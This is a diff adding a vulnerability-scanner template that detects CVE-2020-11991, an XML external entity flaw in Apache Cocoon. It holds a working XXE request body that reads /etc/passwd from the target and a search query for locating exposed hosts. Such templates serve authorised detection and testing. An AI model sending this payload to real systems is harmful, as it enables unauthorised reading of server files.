@@ -1,0 +1,22 @@
+name: Apache Cocoon XML Injection CVE-2020-11991
+manual: true
+query: app="Apache-Cocoon"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /v2/api/product/manger/getInfo
+      headers:
+        Content-type: text/xml
+      body: "<!--?xml version=\"1.0\" ?-->\r\n<!DOCTYPE replace [<!ENTITY ent SYSTEM
+        \"file:///etc/passwd\"> ]>\r\n<userInfo>\r\n<firstName>John</firstName> \r\n<lastName>&ent;</lastName>\r\n</userInfo>"
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2020-11991
+  description: 'Apache Cocoon is a Spring-based framework (since version 2.2 of Cocoon)
+    built around the concepts of separation of concerns and component-based development. '
+  tags: XML Injection
